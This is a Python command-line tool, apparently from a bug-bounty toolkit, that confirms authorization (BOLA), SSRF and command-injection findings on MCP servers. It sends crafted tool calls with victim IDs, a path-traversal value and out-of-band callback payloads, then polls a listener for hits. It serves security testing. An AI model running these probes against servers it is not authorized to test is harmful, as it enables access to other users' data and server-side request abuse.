#!/usr/bin/env python3
"""
mcp-confirm.py — confirm an MCP finding through a TOOL CALL and emit a JSON verdict.

Speaks the streamable-HTTP MCP transport (via curl, so a proxy stays in play). Verdict JSON is
printed to stdout; with --out FILE it is also written there. Nothing else is written.

  authz     (MCP02 / MCP10)  4-way differential over a tool call (own / victim / nonexistent / malformed id)
  ssrf      (MCP05)          unique nonce fired THROUGH the tool; confirmed if an OOB listener sees it
  injection (MCP05)          same, for command execution
  oob-poll  <nonce>          just poll the OOB hit log for a nonce (used after `probe` OOB fires)

## authz
  mcp-bh confirm authz --base-url https://mcp.example.test/mcp --auth "Authorization: Bearer ATTACKER" \\
    --tool get_record --id-param recordId --own-id 1001 --victim-id 1002 --nonexistent-id 999999 \\
    [--malformed-id '%2e%2e'] [--victim-marker 'Lucinda'] [--base-args '{"format":"json"}'] [--out verdict.json]
  Verdict: confirmed / bola-likely / negative / inconclusive.

## ssrf / injection
  Start a listener (`mcp-bh oob-listener`), then:
  MCP_BH_OOB_BASE=http://<ip>:18080 mcp-bh confirm ssrf --base-url ... --tool fetch --param url [--poll 60]
  The listener's hit log is read from $MCP_BH_OOB_LOG (default ./mcp-bh-out/oob-hits.jsonl).
"""
import argparse
import hashlib
import json
import os
import secrets
import subprocess
import sys
import time
from datetime import datetime, timezone
from urllib.parse import urlparse



# ── MCP streamable-HTTP transport (curl, so a proxy stays in play) ──
class MCP:
    def __init__(self, base, headers, proxy, proto, timeout, insecure):
        self.base, self.headers, self.proxy = base, headers, proxy
        self.proto, self.timeout, self.insecure = proto, timeout, insecure
        self.session = None

    def _curl(self, body):
        import tempfile
        hdrf = tempfile.NamedTemporaryFile(delete=False)
        hdrf.close()
        cmd = ["curl", "-sS", "-g", "-m", str(self.timeout),
               "-H", "Content-Type: application/json",
               "-H", "Accept: application/json, text/event-stream",
               "-D", hdrf.name]
        if self.insecure:
            cmd.append("-k")
        if self.proxy:
            cmd += ["--proxy", self.proxy]
        for h in self.headers:
            cmd += ["-H", h]
        if self.session:
            cmd += ["-H", f"Mcp-Session-Id: {self.session}"]
        cmd += ["-d", body, self.base]
        try:
            raw = subprocess.run(cmd, capture_output=True, text=True,
                                 timeout=self.timeout + 5).stdout
        except Exception as e:
            return {"__error__": f"curl:{e}"}
        try:
            for line in open(hdrf.name, errors="ignore"):
                if line.lower().startswith("mcp-session-id:"):
                    self.session = line.split(":", 1)[1].strip()
        finally:
            try:
                os.remove(hdrf.name)
            except OSError:
                pass
        return self._normalize(raw)

    @staticmethod
    def _normalize(raw):
        if "data:" in raw and ("event:" in raw or raw.lstrip().startswith("data:")):
            datas = [ln[5:].lstrip() for ln in raw.splitlines()
                     if ln.rstrip("\r").startswith("data:")]
            try:
                return json.loads("\n".join(datas).strip())
            except Exception:
                pass
        try:
            return json.loads(raw)
        except Exception:
            return {"__error__": "unparseable", "raw": raw[:400]}

    def rpc(self, method, params, mid=None):
        b = {"jsonrpc": "2.0", "method": method, "params": params}
        if mid is not None:
            b["id"] = mid
        return self._curl(json.dumps(b))

    def handshake(self):
        init = self.rpc("initialize", {"protocolVersion": self.proto, "capabilities": {},
                        "clientInfo": {"name": "mcp-bh-confirm", "version": "0.1"}}, 1)
        ok = (isinstance(init, dict) and isinstance(init.get("result"), dict)
              and any(k in init["result"] for k in ("serverInfo", "capabilities", "protocolVersion")))
        if ok:
            self.rpc("notifications/initialized", {})
        return ok, init

    def call(self, tool, arguments):
        """Return (status_int, text, is_error). status: 200 ok, 0 transport, else JSON-RPC error code."""
        msg = self.rpc("tools/call", {"name": tool, "arguments": arguments}, 2)
        if not isinstance(msg, dict):
            return 0, "", True
        if "error" in msg:
            code = msg["error"].get("code", -1) if isinstance(msg["error"], dict) else -1
            return code, json.dumps(msg["error"]), True
        res = msg.get("result", {})
        is_err = bool(isinstance(res, dict) and res.get("isError"))
        parts = []
        if isinstance(res, dict):
            for c in res.get("content", []) or []:
                parts.append(c.get("text", "") if c.get("type") == "text" else json.dumps(c))
            if not parts:
                parts.append(json.dumps(res))
        else:
            parts.append(json.dumps(res))
        return (200 if not is_err else 1), "\n".join(parts), is_err


def digest(text):
    b = text.encode("utf-8", "replace")
    return {"status": 200, "len": len(b), "sha": hashlib.sha256(b).hexdigest()[:16], "snip": text[:200]}


def make_mcp(a):
    return MCP(a.base_url, a.headers, a.proxy, a.protocol_version, a.timeout, a.insecure)


def write_sarif(path, rec, rule, tool):
    """Confirmed or likely verdicts become SARIF results; negative/inconclusive yield an empty run."""
    if not path:
        return
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import sarif
    lvl = {"confirmed": "error", "bola-likely": "warning"}.get(rec["verdict"])
    res = [sarif.result(rule, lvl, rec.get("why") or rec.get("reproducer", rec["verdict"]),
                        [("server", rec["mcp"]["base_url"]), ("tool", tool)], {"verdict": rec["verdict"]})] if lvl else []
    sarif.write(path, res)


def write_evidence(out, rec):
    """Optionally persist the verdict; returns the path or None."""
    if not out:
        return None
    os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
    with open(out, "w") as fh:
        json.dump(rec, fh, indent=2)
    return out


# ── authz: 4-way differential over a tool call (MCP02/MCP10) ──
def cmd_authz(a):
    mcp = make_mcp(a)
    ok, init = mcp.handshake()
    if not ok:
        print("initialize failed (not MCP / auth-gated):", json.dumps(init)[:200], file=sys.stderr)
        sys.exit(3)
    base = json.loads(a.base_args or "{}")

    def call_with(idval):
        args = dict(base)
        args[a.id_param] = idval
        status, text, is_err = mcp.call(a.tool, args)
        d = digest(text)
        d["status"] = status
        d["is_error"] = is_err
        d["body"] = text
        return d

    r = {"own": call_with(a.own_id), "cross": call_with(a.victim_id),
         "nonexistent": call_with(a.nonexistent_id), "malformed": call_with(a.malformed_id)}
    own, cross, non = r["own"], r["cross"], r["nonexistent"]

    verdict, why = "inconclusive", "ambiguous (empty/identical responses) — enrich victim data and re-test"
    if a.victim_marker and not cross["is_error"] and a.victim_marker in cross["body"]:
        verdict, why = "confirmed", f"cross tool-call returned victim marker '{a.victim_marker}'"
    elif cross["is_error"] and cross["status"] in (-32603, -32602, 401, 403, 1):
        verdict, why = "negative", f"cross denied / errored (code {cross['status']})"
    elif not cross["is_error"] and (cross["sha"] != non["sha"] or cross["len"] != non["len"]):
        if cross["sha"] == own["sha"]:
            verdict, why = "negative", "cross == own response (caller's own data; id param ignored)"
        else:
            verdict, why = "bola-likely", "cross distinct from nonexistent-id; add --victim-marker to confirm"
    elif cross["sha"] == non["sha"]:
        verdict, why = "negative", "cross mirrors nonexistent-id (scoped)"

    rec = {"schema": 1, "finding_id": a.finding_id, "vuln_class": "authz",
           "mcp": {"base_url": a.base_url, "tool": a.tool, "id_param": a.id_param},
           "verdict": verdict, "why": why, "ts": datetime.now(timezone.utc).isoformat(),
           "differential": {k: {kk: v[kk] for kk in ("status", "is_error", "len", "sha", "snip")}
                            for k, v in r.items()},
           "negative_control": f"4-way tool-call differential (own/cross/nonexistent/malformed): {why}"}
    path = write_evidence(a.out, rec)
    write_sarif(a.sarif, rec, "MCP02-authz", a.tool)
    print(json.dumps({k: rec[k] for k in ("finding_id", "verdict", "why")}, indent=2))
    if path:
        print(f"wrote {path}")
    if own["is_error"]:
        print(f"  ! positive control weak: own-id call errored (code {own['status']})", file=sys.stderr)


# ── ssrf / injection: OOB callback fired THROUGH the tool (MCP05) ──
def _oob_env(a):
    base = a.oob_base or os.environ.get("MCP_BH_OOB_BASE", "")
    if not base:
        print("error: need --oob-base or $MCP_BH_OOB_BASE (the listener's http://<ip>:<port>)",
              file=sys.stderr)
        sys.exit(2)
    log = os.path.expanduser(os.environ.get("MCP_BH_OOB_LOG", "mcp-bh-out/oob-hits.jsonl"))
    return base.rstrip("/"), log


def _hits_for(log, nonce):
    out = []
    if os.path.exists(log):
        for line in open(log, errors="ignore"):
            line = line.strip()
            if not line:
                continue
            try:
                rr = json.loads(line)
            except json.JSONDecodeError:
                continue
            if rr.get("nonce") == nonce:
                out.append(rr)
    return out


def cmd_oob(a, vuln_class):
    oob_base, log = _oob_env(a)
    mcp = make_mcp(a)
    ok, init = mcp.handshake()
    if not ok:
        print("initialize failed (not MCP / auth-gated):", json.dumps(init)[:200], file=sys.stderr)
        sys.exit(3)

    nonce = "gn" + secrets.token_hex(8)
    oob_url = f"{oob_base}/h/{nonce}"
    payload = a.payload.replace("{{OOB}}", oob_url).replace("{{NONCE}}", nonce) if a.payload else oob_url
    args = json.loads(a.base_args or "{}")
    args[a.param] = payload

    status, text, is_err = mcp.call(a.tool, args)
    print(f"fired nonce {nonce} through {a.tool}({a.param})={payload!r}  -> status={status} err={is_err}")

    deadline = time.time() + int(a.poll)
    hits = []
    while time.time() < deadline:
        hits = _hits_for(log, nonce)
        if hits:
            break
        time.sleep(2)

    ports = {h.get("port") for h in hits}
    rec = {"schema": 1, "finding_id": a.finding_id, "vuln_class": vuln_class,
           "mcp": {"base_url": a.base_url, "tool": a.tool, "param": a.param},
           "verdict": "confirmed" if hits else "inconclusive",
           "channel": a.channel,
           "port_bypass": len(ports) > 1,
           "nonce": nonce, "ts": datetime.now(timezone.utc).isoformat(),
           "tool_call_response": text[:400], "evidence": hits,
           "reproducer": f"call {a.tool}({a.param}={oob_url}) on {a.base_url}; a callback to "
                         f"{oob_url} proves the server executed/fetched it"}
    path = write_evidence(a.out, rec)
    write_sarif(a.sarif, rec, "MCP05-" + vuln_class, a.tool)
    summary = {k: rec[k] for k in ("finding_id", "vuln_class", "verdict", "channel",
                                   "port_bypass", "nonce")}
    print(json.dumps(summary, indent=2))
    if path:
        print(f"wrote {path}")
    if not hits:
        print(f"  no callback within {a.poll}s — blind-negative or the tool did not reach us", file=sys.stderr)


def cmd_poll(a):
    log = os.path.expanduser(os.environ.get("MCP_BH_OOB_LOG", "mcp-bh-out/oob-hits.jsonl"))
    deadline = time.time() + a.poll
    hits = _hits_for(log, a.nonce)
    while not hits and time.time() < deadline:
        time.sleep(1)
        hits = _hits_for(log, a.nonce)
    rec = {"nonce": a.nonce, "verdict": "confirmed" if hits else "inconclusive", "evidence": hits}
    write_evidence(a.out, rec)
    print(json.dumps(rec, indent=2))
    sys.exit(0 if hits else 1)


def main():
    ap = argparse.ArgumentParser(description="Confirm MCP findings via a tool call (evidence gate).")
    sub = ap.add_subparsers(dest="mode", required=True)

    def common(p):
        p.add_argument("--finding-id", default="unnamed", help="free-text label echoed in the verdict")
        p.add_argument("--out", default="", help="also write the verdict JSON here")
        p.add_argument("--sarif", default="", help="also write SARIF 2.1.0 here")
        p.add_argument("--base-url", required=True, help="MCP endpoint URL")
        p.add_argument("-H", "--header", action="append", default=[], dest="headers",
                       help="Auth/extra header, e.g. 'Authorization: Bearer X' (repeatable)")
        p.add_argument("--auth", action="append", default=[], dest="auth_headers",
                       help="alias for -H")
        p.add_argument("--base-args", default="{}", help="JSON of the tool's other arguments")
        p.add_argument("--proxy", default="")
        p.add_argument("--protocol-version", default="2025-06-18")
        p.add_argument("--timeout", type=int, default=30)
        p.add_argument("--insecure", action="store_true")

    pa = sub.add_parser("authz", help="MCP02/MCP10 4-way differential over a tool call")
    common(pa)
    pa.add_argument("--tool", required=True)
    pa.add_argument("--id-param", required=True)
    pa.add_argument("--own-id", required=True)
    pa.add_argument("--victim-id", required=True)
    pa.add_argument("--nonexistent-id", required=True)
    pa.add_argument("--malformed-id", default="%2e%2e%2f")
    pa.add_argument("--victim-marker", default="")

    for name, helptext in (("ssrf", "MCP05 SSRF via a URL/host tool param"),
                           ("injection", "MCP05 command injection via a string tool param")):
        po = sub.add_parser(name, help=helptext)
        common(po)
        po.add_argument("--tool", required=True)
        po.add_argument("--param", required=True)
        po.add_argument("--payload", default="",
                        help="Payload template with {{OOB}}/{{NONCE}}; default = the raw OOB URL")
        po.add_argument("--oob-base", default="", help="Listener base http://<ip>:<port>")
        po.add_argument("--poll", type=int, default=60, help="Seconds to wait for a callback")
        po.add_argument("--channel", choices=["blind", "partial", "full", "credential", "execution"], default="blind",
                        help="Response channel: blind (callback only) < partial < full (content returned) < credential < execution. Severity follows this.")

    pp = sub.add_parser("oob-poll", help="poll the OOB hit log for a nonce")
    pp.add_argument("nonce")
    pp.add_argument("--oob-base", default="")
    pp.add_argument("--poll", type=int, default=60)
    pp.add_argument("--out", default="")
    a = ap.parse_args()
    if a.mode == "oob-poll":
        return cmd_poll(a)
    a.headers = list(a.headers) + list(getattr(a, "auth_headers", []))
    a.proxy = a.proxy or os.environ.get("MCP_BH_PROXY", "")
    if a.mode == "authz":
        cmd_authz(a)
    else:
        cmd_oob(a, a.mode)


if __name__ == "__main__":
    main()
